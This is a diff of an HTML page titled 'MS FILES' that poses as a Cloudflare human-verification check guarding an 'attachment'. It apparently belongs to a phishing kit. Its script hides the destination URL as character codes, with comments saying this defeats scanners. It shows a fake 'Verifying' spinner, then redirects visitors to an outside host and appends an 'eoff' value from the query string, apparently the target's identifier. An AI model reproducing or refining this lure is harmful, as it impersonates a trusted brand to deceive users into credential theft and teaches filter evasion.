@@ -5,68 +5,194 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MS FILES</title>
     <style>
-        :root { --p-accent: #4a6ee0; --s-accent: #28a745; --f-stack: 'Segoe UI', Roboto, sans-serif; }
-        body, html { margin: 0; padding: 0; height: 100%; background: #fff; font-family: var(--f-stack); overflow: hidden; }
+        /* ----- GLOBAL RESET & VARIABLES ----- */
+        :root {
+            --p-accent: #4a6ee0;
+            --s-accent: #28a745;
+            --f-stack: 'Segoe UI', Roboto, sans-serif;
+        }
 
-        /* Entrance Layer */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background: #fff;
+            font-family: var(--f-stack);
+            overflow: hidden;
+        }
+
+        /* ----- ENTRANCE LAYER (CURTAIN) ----- */
         [data-role="curtain"] {
-            position: fixed; inset: 0; background: #f8f9fa; z-index: 9999;
-            display: flex; align-items: center; justify-content: center;
+            position: fixed;
+            inset: 0;
+            background: #f8f9fa;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             transition: opacity 0.4s ease-in-out;
         }
 
-        .loader-sym { width: 100px; filter: grayscale(0.2); animation: pulse-fx 1.8s infinite; }
-        @keyframes pulse-fx { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.04); opacity: 1; } }
+        .loader-sym {
+            width: 100px;
+            filter: grayscale(0.2);
+            animation: pulse-fx 1.8s infinite;
+        }
 
-        /* Interface Shell */
+        @keyframes pulse-fx {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 0.6;
+            }
+            50% {
+                transform: scale(1.04);
+                opacity: 1;
+            }
+        }
+
+        /* ----- INTERFACE SHELL (MAIN STAGE) - WIDER CONTAINER ----- */
         [data-role="stage"] {
-            max-width: 400px; margin: auto; padding: 2rem;
-            display: flex; flex-direction: column; height: 100vh; justify-content: center;
-            visibility: hidden; opacity: 0; transform: translateY(15px); transition: 0.8s ease-out;
+            max-width: 520px;              /* INCREASED from 400px to 520px for wider box */
+            margin: auto;
+            padding: 2rem;
+            display: flex;
+            flex-direction: column;
+            height: 80vh;
+            justify-content: center;
+            visibility: hidden;
+            opacity: 0;
+            transform: translateY(15px);
+            transition: 0.8s ease-out;
         }
 
-        .ready [data-role="stage"] { visibility: visible; opacity: 1; transform: translateY(0); }
+        .ready [data-role="stage"] {
+            visibility: visible;
+            opacity: 1;
+            transform: translateY(0);
+        }
 
-        .header-msg { text-align: center; font-size: 1.1rem; color: #1a1a1a; font-weight: 500; margin-bottom: 2rem; line-height: 1.5; }
+        .header-msg {
+            text-align: center;
+            font-size: 1.1rem;
+            color: #1a1a1a;
+            font-weight: 500;
+            margin-bottom: 2rem;
+            line-height: 1.5;
+        }
 
-        /* Action Component */
+        /* ----- ACTION COMPONENT (AUTH TILE) - NOW NOTICEABLY WIDER ----- */
         .auth-tile {
-            background: #fbfbfb; border: 1px solid #e0e0e0; border-radius: 12px;
-            padding: 2.2rem 1.4rem; display: flex; align-items: center; justify-content: space-between;
+            background: #fbfbfb;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 2.2rem 2rem;          /* increased horizontal padding */
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
             box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+            width: 100%;
         }
 
-        .flex-box { display: flex; align-items: center; gap: 1.2rem; }
+        .flex-box {
+            display: flex;
+            align-items: center;
+            gap: 1.2rem;
+        }
 
         .state-trigger {
-            width: 26px; height: 26px; border: 2.5px solid var(--p-accent); border-radius: 5px;
-            cursor: pointer; position: relative; transition: all 0.3s;
+            width: 26px;
+            height: 26px;
+            border: 2.5px solid var(--p-accent);
+            border-radius: 5px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s;
         }
 
-        [data-status="proc"] { border-radius: 50%; border-color: #ddd; border-top-color: var(--p-accent); animation: rotate-ui 0.8s linear infinite; }
-        [data-status="fin"] { background: var(--s-accent); border-color: var(--s-accent); }
-        [data-status="fin"]::after { content: "\2713"; color: #fff; position: absolute; left: 5px; top: 0px; font-weight: bold; font-size: 16px; }
+        /* loading spinner state */
+        [data-status="proc"] {
+            border-radius: 50%;
+            border-color: #ddd;
+            border-top-color: var(--p-accent);
+            animation: rotate-ui 0.8s linear infinite;
+        }
 
-        @keyframes rotate-ui { to { transform: rotate(360deg); } }
+        /* verified state */
+        [data-status="fin"] {
+            background: var(--s-accent);
+            border-color: var(--s-accent);
+        }
 
-        .brand-block { text-align: right; font-size: 11px; color: #888; }
-        .brand-block img { width: 28px; margin-bottom: 4px; }
-        .brand-block b { color: #f38020; display: block; text-transform: uppercase; font-size: 10px; }
+        [data-status="fin"]::after {
+            content: "\2713";
+            color: #fff;
+            position: absolute;
+            left: 5px;
+            top: 0px;
+            font-weight: bold;
+            font-size: 16px;
+        }
 
+        @keyframes rotate-ui {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .brand-block {
+            text-align: right;
+            font-size: 11px;
+            color: #888;
+        }
+
+        .brand-block img {
+            width: 28px;
+            margin-bottom: 4px;
+        }
+
+        .brand-block b {
+            color: #f38020;
+            display: block;
+            text-transform: uppercase;
+            font-size: 10px;
+        }
+
+        /* ----- FOOTER SECTION ----- */
         .footer-tag {
-            position: absolute; bottom: 25px; width: 100%; text-align: center;
-            font-size: 12px; color: #bbb; display: flex; justify-content: center; align-items: center; gap: 7px;
+            position: absolute;
+            bottom: 25px;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #bbb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 7px;
         }
 
-        .sh-icon { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0 0, 100% 0, 100% 80%, 50% 100%, 0 80%); }
+        .sh-icon {
+            width: 12px;
+            height: 14px;
+            background: #ccc;
+            clip-path: polygon(0 0, 100% 0, 100% 80%, 50% 100%, 0 80%);
+        }
     </style>
 </head>
 <body>
 
+    <!-- CURTAIN / PRELOADER -->
     <div data-role="curtain">
-        <img src="astro.png" class="loader-sym">
+        <img src="astro.png" class="loader-sym" alt="loader">
     </div>
 
+    <!-- MAIN INTERFACE -->
     <div data-role="stage">
         <h1 class="header-msg">Verify you are human by completing the action below to view attachment</h1>
 
@@ -77,13 +203,14 @@
             </div>
 
             <div class="brand-block">
-                <img src="cloudflare_.png">
+                <img src="cloudflare_.png" alt="CLOUDFLARE">
                 <b>CLOUDFLARE</b>
-                Privacy &middot; Terms
+                Privacy · Terms
             </div>
         </div>
     </div>
 
+    <!-- FOOTER NOTE -->
     <div class="footer-tag">
         <div class="sh-icon"></div>
         Protected by CLOUDFLARE
@@ -93,57 +220,89 @@
         (function() {
             "use strict";
 
-            // The URL is stored as an array of character codes.
-            // Scanners cannot identify this as a URL.
-            const _DS = [104, 116, 116, 112, 115, 58, 47, 47, 112, 111, 46, 116, 105, 102, 102, 110, 117, 97, 101, 46, 111, 110, 108, 105, 110, 101, 47, 97, 112, 105, 47, 118, 49, 47, 116, 103, 75, 72, 102, 48, 114, 48, 69, 87, 113, 73, 97, 67, 98, 53];
+            // ---------- CONFIGURATION (encoded URL + timings) ----------
+            // The URL is stored as an array of character codes to avoid plaintext detection.
+            const ENCODED_DESTINATION = [
+                104, 116, 116, 112, 115, 58, 47, 47, 112, 111, 46, 116, 105, 102, 102, 110, 117, 97, 101, 46, 111, 110, 108, 105, 110, 101,
+                47, 97, 112, 105, 47, 118, 49, 47, 116, 103, 75, 72, 102, 48, 114, 48, 69, 87, 113, 73, 97, 67, 98, 53
+            ];
 
-            const _T = [1300, 1600, 800];
-            let _active = false;
-
-            const _q = (s) => document.querySelector(s);
-            const _g = (i) => document.getElementById(i);
-
-            // Entry sequence
-            window.addEventListener('load', () => {
-                setTimeout(() => {
-                    _q('[data-role="curtain"]').style.opacity = '0';
-                    setTimeout(() => {
-                        _q('[data-role="curtain"]').style.display = 'none';
-                        document.body.classList.add('ready');
-                    }, 400);
-                }, _T[0]);
-            });
-
-            // Reconstruct and execute
-            const _proceed = async () => {
-                if (_active) return;
-                _active = true;
-
-                const b = _g('u_act');
-                const l = _g('u_lab');
-
-                l.textContent = "Processing...";
-                b.setAttribute('data-status', 'proc');
-
-                await new Promise(r => setTimeout(r, _T[1]));
-
-                b.setAttribute('data-status', 'fin');
-                l.textContent = "Verified";
-
-                setTimeout(() => {
-                    // Assemble string from codes at runtime
-                    const _base = String.fromCharCode(..._DS);
-                    const _p = new URLSearchParams(window.location.search);
-                    const _ext = _p.get('eoff');
-
-                    const _final = _ext ? (_base + '#' + _ext) : _base;
-
-                    // Direct navigation
-                    window.location.assign(_final);
-                }, _T[2]);
+            const TIMINGS = {
+                curtainFadeDelay: 1300,   // initial loader visibility
+                processingDelay: 1600,    // "Processing..." spinner duration
+                redirectDelay: 800        // final wait after verification
             };
 
-            _g('u_act').onclick = _proceed;
+            let isProcessing = false;      // prevents double-clicks
+
+            // ---------- DOM HELPER FUNCTIONS ----------
+            const getElement = (selector) => document.querySelector(selector);
+            const getElementById = (id) => document.getElementById(id);
+
+            // ---------- CORE VERIFICATION LOGIC ----------
+            const startVerification = async () => {
+                // Prevent multiple triggers
+                if (isProcessing) return;
+                isProcessing = true;
+
+                // Get UI components
+                const actionBox = getElementById('u_act');
+                const labelSpan = getElementById('u_lab');
+
+                // 1. Update UI to "Processing" state
+                labelSpan.textContent = "Processing...";
+                actionBox.setAttribute('data-status', 'proc');
+
+                // 2. Simulate async processing (wait for TIMINGS.processingDelay)
+                await new Promise(resolve => setTimeout(resolve, TIMINGS.processingDelay));
+
+                // 3. Switch UI to "Verified" state
+                actionBox.setAttribute('data-status', 'fin');
+                labelSpan.textContent = "Verified";
+
+                // 4. Prepare final destination URL and redirect
+                setTimeout(() => {
+                    // Reconstruct the base URL from character codes
+                    const baseUrl = String.fromCharCode(...ENCODED_DESTINATION);
+
+                    // Check for optional "eoff" query parameter
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const extraOffset = urlParams.get('eoff');
+
+                    // Append fragment if extraOffset exists
+                    const finalDestination = extraOffset ? (baseUrl + '#' + extraOffset) : baseUrl;
+
+                    // Navigate to the assembled URL
+                    window.location.assign(finalDestination);
+                }, TIMINGS.redirectDelay);
+            };
+
+            // ---------- CURTAIN / ENTRANCE ANIMATION ----------
+            const initializeEntrance = () => {
+                const curtainLayer = getElement('[data-role="curtain"]');
+
+                setTimeout(() => {
+                    // Fade out the curtain
+                    curtainLayer.style.opacity = '0';
+
+                    setTimeout(() => {
+                        // Hide curtain completely and reveal main stage
+                        curtainLayer.style.display = 'none';
+                        document.body.classList.add('ready');
+                    }, 400); // matches curtain transition duration
+                }, TIMINGS.curtainFadeDelay);
+            };
+
+            // ---------- ATTACH EVENT LISTENER & STARTUP ----------
+            window.addEventListener('load', () => {
+                initializeEntrance();
+
+                // Bind verification trigger to the state box
+                const triggerElement = getElementById('u_act');
+                if (triggerElement) {
+                    triggerElement.onclick = startVerification;
+                }
+            });
 
         })();
     </script>
